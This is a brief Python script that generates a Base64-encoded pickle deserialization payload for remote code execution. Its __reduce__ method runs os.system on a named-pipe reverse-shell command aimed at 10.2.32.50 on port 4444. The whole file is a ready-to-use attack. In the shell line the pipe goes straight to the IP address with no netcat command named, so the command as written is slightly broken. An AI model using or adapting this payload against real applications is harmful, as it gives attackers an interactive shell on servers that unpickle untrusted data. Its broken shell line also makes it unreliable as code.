# This code will turn the entered command into a Base64 Encoded byte string.

import pickle
import sys
import base64

command = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | 10.2.32.50 4444 > /tmp/f"

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
